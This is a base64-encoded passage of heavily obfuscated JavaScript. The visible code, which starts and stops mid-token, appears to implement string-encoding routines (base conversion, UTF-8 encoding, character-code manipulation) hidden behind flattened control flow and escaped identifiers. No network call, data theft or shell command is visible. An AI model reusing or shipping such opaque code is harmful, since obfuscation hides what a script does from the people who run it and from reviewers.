ZSBfX19fX3hwdS0zODY6Y2FzZSA3NjpbX19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjZceDdhXHg2NCJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY1XHg2ZVx4NmYiXSxfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjZcdTAwN2FcdTAwNjQiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHgzOVx4NzNceDZiIl0sX19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjZceDdhXHg2NCJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDMwXHg2OVx4NzUiXV09Wy00MCwtMTA0LDI1XTtjYXNlLTEyMTpjYXNlIDY0OltfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjZcdTAwN2FcdTAwNjQiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NVx4NmVceDZmIl0sX19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjZceDdhXHg2NCJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM5XHg3M1x4NmIiXSxfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHg2Nlx4N2FceDY0Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMFx1MDA2OVx1MDA3NSJdXT1bNTgsLTEzMiwtMTk1XTt0cnl7X19fX19fdGk1fWNhdGNoKF9fX19fZ3g2KXtfX19fX190aTU9X19fX19fM2gxW19fX19fX2x4ZSstMjhdfV9fX19memRbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Mlx1MDA3N1x1MDA3MSJdPV9fX19fX3RpNT9fX19fX18zaDFbX19fX19fbHhlKy0xN10rX19fX19fM2gxW19fX19feHB1KzUwXStfX19fX18zaDFbX19fX194cHUrNTFdOl9fX19fXzNoMVsxM10rX19fX19fM2gxWzM3XStfX19fX18zaDFbX19fX194cHUrNTNdO19fX196dHFbIlx4NWZceDVmXHg1Zlx4MzFceDM4XHgzNCJdPV9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA3YVx1MDA2NCJdLF9fX19feHB1Kz0tNTcsX19fX19fbHhlKz0tMjQzLF9fX192dDArPTE5NjticmVhaztpZihfX19fX3hwdT5fX19fX3hwdSsxOTYpe19fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMVx1MDAzOFx1MDAzNCJdPV9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA3YVx1MDA2NCJdLF9fX19feHB1Kz0tNTcsX19fX19fbHhlKz0tMzMsX19fX3Z0MCs9LTk7YnJlYWt9Y2FzZS0xMTk6Y2FzZS02MTpjYXNlIF9fX19feHB1LTE0ODpyZXR1cm4gX19fX19oNng9dHJ1ZSxfX19fXzJuZztfX19fenRxWyJceDVmXHg1Zlx4NWZceDMxXHgzOFx4MzQiXT1fX19fenRxWyJceDVmXHg1Zlx4NWZceDc2XHg3OFx4NzMiXSxfX19fX19seGUrPTIzOSxfX19fdnQwKz0tMzc7YnJlYWt9fX19dmFyIF9fX19faDZ4O3ZhciBfX19fX19seGU9X19fX194cHUoLTE1LDMwLC0xMzYpWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX19faDZ4KXtyZXR1cm4gX19fX19fbHhlfX1mdW5jdGlvbiBfX19fX19xMDcoX19fX19fdGk1KXtmdW5jdGlvbipfX19fX3hwdShfX19fX3hwdSxfX19fX19seGUsX19fX3Z0MD17WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXTp7fX0pe3doaWxlKF9fX19feHB1K19fX19fX2x4ZSE9PS05NSl7d2l0aChfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmRceDc4XHg2NiJdfHxfX19fdnQwKXtzd2l0Y2goX19fX194cHUrX19fX19fbHhlKXtjYXNlIF9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmJceDY0XHgzOCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwNzlcdTAwNmEiXSs4OmNhc2UgX19fX194cHUhPS0zMDEmJl9fX19feHB1LSAtMjA2OmZvcihfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDdhXHg2Zlx4MzEiXT1fX19fX18zaDFbX19fX194cHUrLTM0XTtfX19fX3pvMTxfX19fX19wMDI7X19fX196bzErPV9fX19fXzNoMVtfX19fX3hwdSstMjFdKXtfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZiXHg2NFx4MzgiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4NjRceDZjXHg2OSJdPV9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fem8xKTw8X19fX19fM2gxW19fX19feHB1Ky0yOF18KF9fX19fem8xK19fX19fXzNoMVtfX19fX3hwdSstKF9fX19feHB1Ky0xKV08X19fX19fcDAyP19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fem8xK19fX19fXzNoMVsxXSk8PF9fX19fXzNoMVs3XTpfX19fX18zaDFbX19fX194cHUrLTM0XSl8KF9fX19fem8xK19fX19fXzNoMVtfX19fX3hwdSstMzZdPF9fX19fX3AwMj9fX19fX190aTUuY2hhckNvZGVBdChfX19fX3pvMStfX19fX18zaDFbX19fX194cHUrLTM2XSk6X19fX19fM2gxWzJdKTtmb3IoX19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Ylx4NjRceDM4Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Zlx1MDA2OVx1MDA3MiJdPV9fX19fXzNoMVtfX19fX3hwdSstMzRdO19fX29pcjxfX19fX18zaDFbMTZdO19fX29pcisrKXtpZihfX19fX3pvMSpfX19fX18zaDFbN10rX19fb2lyKl9fX19fXzNoMVsxN10+X19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pX19fb3B4Kz1fX19hOWc7ZWxzZSBfX19vcHgrPV9fXzRwMS5jaGFyQXQoX19fX2RsaT4+Pl9fX19fXzNoMVtfX19fX3hwdSstMTldKihfX19fX18zaDFbMTVdLV9fX29pcikmX19fX19fM2gxWzE5XSl9fXJldHVybiBfX19fX2g2eD10cnVlLF9fX29weDtfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmRceDc4XHg2NiJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OVx1MDA3NVx1MDA3MSJdLF9fX19feHB1Kz0tMzM3O2JyZWFrO2Nhc2UtMTk0OmNhc2UtODc6X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZkXHg3OFx4NjYiXT1fX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXSxfX19fX3hwdSs9MTM0LF9fX19fX2x4ZSs9NTg7YnJlYWs7aWYoIShfX19fX19seGU9PS0oX19fX194cHUrMTk0KSkpe19fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDA3OFx1MDA2NiJdPV9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmJceDY0XHgzOCJdLF9fX19feHB1Kz0xMzQsX19fX19fbHhlKz01ODticmVha31jYXNlIF9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmJceDY0XHgzOCJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwNzlcdTAwNmEiXSsxODM6Y2FzZSAyMTc6Y2FzZSBfX19fX3hwdSE9MTY2JiZfX19fX3hwdS0gLTM5OltfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDc5XHUwMDZhIl0sX19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZiXHUwMDY0XHUwMDM4Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2OFx4NzBceDMwIl1dPVs4MywxMDVdO2ZvcihfX19fX3pvMT1fX19fX18zaDFbMl07X19fX196bzE8X19fX19fcDAyO19fX19fem8xKz1fX19fX18zaDFbX19fX194cHUrMF0pe19fX19kbGk9X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX196bzEpPDxfX19fX18zaDFbX19fX194cHUrLTddfChfX19fX3pvMStfX19fX18zaDFbMV08X19fX19fcDAyP19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fem8xK19fX19fXzNoMVtfX19fX3hwdSstMTRdKTw8X19fX19fM2gxW19fX19feHB1Ky04XTpfX19fX18zaDFbX19fX194cHUrLShfX19fX3hwdSstMildKXwoX19fX196bzErX19fX19fM2gxW19fX19feHB1Ky0xNV08X19fX19fcDAyP19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fem8xK19fX19fXzNoMVswXSk6X19fX19fM2gxWzJdKTtmb3IoX19fb2lyPV9fX19fXzNoMVsyXTtfX19vaXI8X19fX19fM2gxWzE2XTtfX19vaXIrKyl7aWYoX19fX196bzEqX19fX19fM2gxW19fX19feHB1Ky04XStfX19vaXIqX19fX19fM2gxWzE3XT5fX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVtfX19fX3hwdSstOF0pX19fb3B4Kz1fX19hOWc7ZWxzZSBfX19vcHgrPV9fXzRwMS5jaGFyQXQoX19fX2RsaT4+Pl9fX19fXzNoMVtfX19fX3hwdSsyXSooX19fX19fM2gxW19fX19feHB1KzBdLV9fX29pcikmX19fX19fM2gxWzE5XSl9fXJldHVybiBfX19fX2g2eD10cnVlLF9fX29weDtfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmRceDc4XHg2NiJdPV9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMVx1MDA2N1x1MDA2ZiJdLF9fX19feHB1Kz0tMzE2LF9fX19fX2x4ZSs9MTY3O2JyZWFrO2Nhc2UtMTE1OltfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZiXHg2NFx4MzgiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMzXHUwMDc5XHUwMDZhIl0sX19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZiXHUwMDY0XHUwMDM4Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2OFx4NzBceDMwIl1dPVsyMiwxNTddO3RyeXtfX19hOWd9Y2F0Y2goX19fX3p0cSl7X19fYTlnPSIifV9fX19fX2tkOFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM0XHUwMDcwXHUwMDMxIl09X19fX19fM2gxWzE0NF0rX19fX19fM2gxW19fX19feHB1KzQ5OV0rX19fX19fM2gxWzE0Nl0rX19fX19fM2gxW19fX19feHB1KzUwMV0rX19fX19fM2gxWzE0OF0rX19fX19fM2gxW19fX19feHB1KzUwM10rX19fX19fM2gxW19fX19feHB1KzUwNF0rX19fX19fM2gxWzE0Ml07X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZkXHg3OFx4NjYiXT1fX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZiXHg2NFx4MzgiXSxfX19fX3hwdSs9MzQxLF9fX19fX2x4ZSs9LTIyODticmVhaztjYXNlIF9fX19fX2x4ZS0xMzpfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXVsiXHg1Zlx4NWZceDVmXHg2Zlx4NzBceDc4Il09IiI7X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Ylx4NjRceDM4Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NzBceDMwXHgzMiJdPV9fX19fX3RpNS5sZW5ndGg7X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZkXHg3OFx4NjYiXT1fX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwMzgiXSxfX19fX3hwdSs9NDksX19fX19fbHhlKz0xOTU7YnJlYWs7ZGVmYXVsdDp9fX19dmFyIF9fX19faDZ4O3ZhciBfX19fX19seGU9X19fX194cHUoLTM1NCwyMzkpWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX19faDZ4KXtyZXR1cm4gX19fX19fbHhlfX1mdW5jdGlvbiBfX19fX19oajMoX19fX19fdGk1LF9fX2E5Zyl7dmFyIF9fX19feHB1PV9fX2E5Zy5sZW5ndGg7dmFyIF9fX19faDZ4PUFycmF5KCk7dmFyIF9fX19fX2x4ZSxfX19fdnQwLF9fX196dHEsX19fX19neDY7dmFyIF9fX3kxOD1BcnJheShNYXRoLmNlaWwoX19fX19fdGk1Lmxlbmd0aC9fX19fX18zaDFbMF0pKTtmb3IoX19fX19fbHhlPV9fX19fXzNoMVsyXTtfX19fX19seGU8X19feTE4Lmxlbmd0aDtfX19fX19seGUrKyl7X19feTE4W19fX19fX2x4ZV09X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19fbHhlKl9fX19fXzNoMVswXSk8PF9fX19fXzNoMVs3XXxfX19fX190aTUuY2hhckNvZGVBdChfX19fX19seGUqX19fX19fM2gxWzBdK19fX19fXzNoMVsxXSl9d2hpbGUoX19feTE4Lmxlbmd0aD5fX19fX18zaDFbMl0pe19fX19fZ3g2PUFycmF5KCk7X19fX3p0cT1fX19fX18zaDFbMl07Zm9yKF9fX19fX2x4ZT1fX19fX18zaDFbMl07X19fX19fbHhlPF9fX3kxOC5sZW5ndGg7X19fX19fbHhlKyspe19fX196dHE9KF9fX196dHE8PF9fX19fXzNoMVs4XSkrX19feTE4W19fX19fX2x4ZV07X19fX3Z0MD1NYXRoLmZsb29yKF9fX196dHEvX19fX194cHUpO19fX196dHEtPV9fX192dDAqX19fX194cHU7aWYoX19fX19neDYubGVuZ3RoPl9fX19fXzNoMVsyXXx8X19fX3Z0MD5fX19fX18zaDFbMl0pX19fX19neDZbX19fX19neDYubGVuZ3RoXT1fX19fdnQwfV9fX19faDZ4W19fX19faDZ4Lmxlbmd0aF09X19fX3p0cTtfX195MTg9X19fX19neDZ9dmFyIF9fX19fXzJwdD0iIjtmb3IoX19fX19fbHhlPV9fX19faDZ4Lmxlbmd0aC1fX19fX18zaDFbMV07X19fX19fbHhlPj1fX19fX18zaDFbMl07X19fX19fbHhlLS0pX19fX19fMnB0Kz1fX19hOWcuY2hhckF0KF9fX19faDZ4W19fX19fX2x4ZV0pO3ZhciBfX19fXzBsYj1NYXRoLmNlaWwoX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10vKE1hdGgubG9nKF9fX2E5Zy5sZW5ndGgpL01hdGgubG9nKF9fX19fXzNoMVswXSkpKTtmb3IoX19fX19fbHhlPV9fX19fXzJwdC5sZW5ndGg7X19fX19fbHhlPF9fX19fMGxiO19fX19fX2x4ZSsrKV9fX19fXzJwdD1fX19hOWdbX19fX19fM2gxWzJdXStfX19fX18ycHQ7cmV0dXJuIF9fX19fXzJwdH1mdW5jdGlvbiBfX192cHooX19fX19fdGk1KXt2YXIgX19fYTlnPSIiO3ZhciBfX19fX3hwdT0tX19fX19fM2gxWzFdO3ZhciBfX19fX2g2eCxfX19fX19seGU7d2hpbGUoKytfX19fX3hwdTxfX19fX190aTUubGVuZ3RoKXtfX19fX2g2eD1fX19fX190aTUuY2hhckNvZGVBdChfX19fX3hwdSk7X19fX19fbHhlPV9fX19feHB1K19fX19fXzNoMVsxXTxfX19fX190aTUubGVuZ3RoP19fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19feHB1K19fX19fXzNoMVsxXSk6X19fX19fM2gxWzJdO2lmKF9fX19fXzNoMVszOV08PV9fX19faDZ4JiZfX19fX2g2eDw9X19fX19fM2gxWzQwXSYmX19fX19fM2gxWzQxXTw9X19fX19fbHhlJiZfX19fX19seGU8PV9fX19fXzNoMVs0Ml0pe19fX19faDZ4PV9fX19fXzNoMVs0M10rKChfX19fX2g2eCZfX19fX18zaDFbMThdKTw8X19fX19fM2gxWzRdKSsoX19fX19fbHhlJl9fX19fXzNoMVsxOF0pO19fX19feHB1Kyt9aWYoX19fX19oNng8PV9fX19fXzNoMVs0NF0pX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19faDZ4KTtlbHNlIGlmKF9fX19faDZ4PD1fX19fX18zaDFbNDVdKV9fX2E5Zys9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX18zaDFbNDZdfF9fX19faDZ4Pj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbNDddLF9fX19fXzNoMVsyMF18X19fX19oNngmX19fX19fM2gxWzE5XSk7ZWxzZSBpZihfX19fX2g2eDw9X19fX19fM2gxWzMwXSlfX19hOWcrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzQ4XXxfX19fX2g2eD4+Pl9fX19fXzNoMVsyMV0mX19fX19fM2gxWzE0XSxfX19fX18zaDFbMjBdfF9fX19faDZ4Pj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbMTldLF9fX19fXzNoMVsyMF18X19fX19oNngmX19fX19fM2gxWzE5XSk7ZWxzZSBpZihfX19fX2g2eDw9X19fX19fM2gxWzQ5XSlfX19hOWcrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzUwXXxfX19fX2g2eD4+Pl9fX19fXzNoMVsyN10mX19fX19fM2gxWzI2XSxfX19fX18zaDFbMjBdfF9fX19faDZ4Pj4+X19fX19fM2gxWzIxXSZfX19fX18zaDFbMTldLF9fX19fXzNoMVsyMF18X19fX19oNng+Pj5fX19fX18zaDFbMTddJl9fX19fXzNoMVsxOV0sX19fX19fM2gxWzIwXXxfX19fX2g2eCZfX19fX18zaDFbMTldKX1yZXR1cm4gX19fYTlnfWZ1bmN0aW9uIF9fX19xYzMoX19fX19fdGk1KXtmdW5jdGlvbipfX19hOWcoX19fYTlnLF9fX19faDZ4LF9fX19fX2x4ZSxfX19fdnQwLF9fX196dHE9e1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY0XHUwMDc0XHUwMDMxIl06e319KXt3aGlsZShfX19hOWcrX19fX19oNngrX19fX19fbHhlK19fX192dDAhPT00MSl7d2l0aChfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHgzNVx4NjdceDY3Il18fF9fX196dHEpe3N3aXRjaChfX19hOWcrX19fX19oNngrX19fX19fbHhlK19fX192dDApe2Nhc2UgMTE6Y2FzZSBfX19hOWctMzk1OltfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjRceDc0XHgzMSJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwMzlcdTAwNmUiXSxfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjRceDc0XHgzMSJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM4XHg3NFx4MzMiXV09Wy0yMjcsLTM1XTtfX19fX2R0MVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NjNceDY4Il09IiI7Zm9yKF9fX19fZHQxWyJceDVmXHg1Zlx4NWZceDc4XHg2ZVx4NjkiXT1fX19fX18zaDFbX19fYTlnKy0xNjNdO19fX19fZHQxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzhcdTAwNmVcdTAwNjkiXTxfX19fX190aTUubGVuZ3RoO19fX19fZHQxWyJceDVmXHg1Zlx4NWZceDc4XHg2ZVx4NjkiXSsrKV9fX19fZHQxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNjNcdTAwNjgiXSs9U3RyaW5nLmZyb21DaGFyQ29kZShfX19fX190aTUuY2hhckNvZGVBdChfX19fX2R0MVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDZlXHUwMDY5Il0pJl9fX19fXzNoMVtfX19fX19seGUrMzIyXSxfX19fX190aTUuY2hhckNvZGVBdChfX19fX2R0MVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc4XHUwMDZlXHUwMDY5Il0pPj4+X19fX19fM2gxWzddJl9fX19fXzNoMVtfX19hOWcrLTE0M10pO3JldHVybiBfX19fX3hwdT10cnVlLF9fX19fZHQxWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY0XHg2M1x4NjgiXTtfX19hOWcrPTQ1LF9fX19faDZ4Kz0yMzIsX19fX19fbHhlKz0xNjEsX19fX3Z0MCs9LTE2NzticmVhaztjYXNlIF9fX196dHFbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2NFx4NzRceDMxIl1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzhceDc0XHgzMyJdKy0xMTpkZWZhdWx0OmNhc2UgMTg1OltfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjRcdTAwNzRcdTAwMzEiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZiXHUwMDM5XHUwMDZlIl0sX19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDY0XHg3NFx4MzEiXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDM4XHUwMDc0XHUwMDMzIl1dPVsxNjgsMTQzXTtfX19fenRxWyJceDVmXHg1Zlx4NWZceDVmXHgzNVx4NjdceDY3Il09X19fX3p0cVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZkXHUwMDYyXHUwMDMwIl0sX19fYTlnKz0zOCxfX19fX2g2eCs9MjYsX19fX19fbHhlKz0tNDE1LF9fX192dDArPTE2NzticmVhaztjYXNlIF9fX19faDZ4LTU1Ol9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzNVx1MDA2N1x1MDA2NyJdPV9fX196dHFbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2NFx1MDA3NFx1MDAzMSJdLF9fX19faDZ4Kz0tMTE1LF9fX19fX2x4ZSs9NzAsX19fX3Z0MCs9MTcwO2JyZWFrO2Nhc2UgX19fX3Z0MC0xNjY6X19fX3p0cVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzVceDY3XHg2NyJdPV9fX196dHFbIlx4NWZceDVmXHg1Zlx4MzhceDc4XHgzNSJdLF9fX2E5Zys9MzgsX19fX19oNngrPTk2LF9fX19fX2x4ZSs9LTMwOCxfX19fdnQwKz0xMzY7YnJlYWs7Y2FzZSAxNDY6Y2FzZSBfX19fX2g2eC03NDpfX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzVcdTAwNjdcdTAwNjciXT1fX19fenRxWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmJcdTAwNjRcdTAwNzkiXSxfX19hOWcrPTgzLF9fX19faDZ4Kz0tMjE1LF9fX19fX2x4ZSs9LTE0NyxfX19fdnQwKz0xNTI7YnJlYWt9fX19dmFyIF9fX19feHB1O3ZhciBfX19fX2g2eD1fX19hOWcoMTY1LC0yMDUsLTMwMCwxMTApWyJcdTAwNmVcdTAwNjVcdTAwNzhcdTAwNzQiXSgpWyJceDc2XHg2MVx4NmNceDc1XHg2NSJdO2lmKF9fX19feHB1KXtyZXR1cm4gX19fX19oNnh9fWZ1bmN0aW9uIF9fX19fX3hsYyhfX19fX190aTUpe2Z1bmN0aW9uKl9fX2E5ZyhfX19hOWcsX19fX19oNngsX19fX19fbHhlPXtbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2MVx4MzJceDc3Il06e319KXt3aGlsZShfX19hOWcrX19fX19oNnghPT0tMTQ3KXt3aXRoKF9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDYzXHUwMDMxXHUwMDYyIl18fF9fX19fX2x4ZSl7c3dpdGNoKF9fX2E5ZytfX19fX2g2eCl7Y2FzZSBfX19fX2g2eC0yMjpbX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjFceDMyXHg3NyJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzBcdTAwMzRcdTAwN2EiXSxfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2MVx1MDAzMlx1MDA3NyJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDM3XHg2Nlx4MzkiXV09Wy0xNzcsLTE4MF07X19fX19hMndbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA2M1x1MDA3YSJdPSIiO2ZvcihfX19fX2Eyd1siXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY2XHUwMDcyXHUwMDYxIl09X19fX19fM2gxW19fX2E5ZysyNF07X19fX19hMndbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA3Mlx1MDA2MSJdPF9fX19fX3RpNS5sZW5ndGg7X19fX19hMndbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA3Mlx1MDA2MSJdKyspX19fX19hMndbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA2M1x1MDA3YSJdKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fX3RpNS5jaGFyQ29kZUF0KF9fX19fYTJ3WyJceDVmXHg1Zlx4NWZceDVmXHg2Nlx4NzJceDYxIl0pPj4+X19fX19fM2gxW19fX2E5ZysyOV0mX19fX19fM2gxWzIyXSxfX19fX190aTUuY2hhckNvZGVBdChfX19fX2Eyd1siXHg1Zlx4NWZceDVmXHg1Zlx4NjZceDcyXHg2MSJdKSZfX19fX18zaDFbMjJdKTtyZXR1cm4gX19fX194cHU9dHJ1ZSxfX19fX2Eyd1siXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2Nlx4NjNceDdhIl07X19fYTlnKz05NixfX19fX2g2eCs9LTE0NDticmVhaztjYXNlLTI0NDpjYXNlIF9fX19fX2x4ZVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDYxXHUwMDMyXHUwMDc3Il1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzdceDY2XHgzOSJdKzMwNzpfX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2M1x1MDAzMVx1MDA2MiJdPV9fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NmFceDYxXHg3NCJdLF9fX2E5Zys9LTE3NSxfX19fX2g2eCs9LTk5O2JyZWFrO2Nhc2UtMTA1OmNhc2UgX19fX19oNnghPTI0JiZfX19fX2g2eC0xMzc6Y2FzZS0yMjA6W19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDYxXHgzMlx4NzciXVsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDcwXHUwMDM0XHUwMDdhIl0sX19fX19fbHhlWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NjFceDMyXHg3NyJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzdcdTAwNjZcdTAwMzkiXV09WzI1LC0yMTRdO19fX19fX2x4ZVsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDYzXHgzMVx4NjIiXT1fX19fX19seGVbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Y1x1MDA3Nlx1MDA2NyJdLF9fX2E5Zys9MTE1LF9fX19faDZ4Kz0tNDA2O2JyZWFrO2RlZmF1bHQ6Y2FzZS0yMDQ6Y2FzZS0xMDE6X19fX19fbHhlWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAw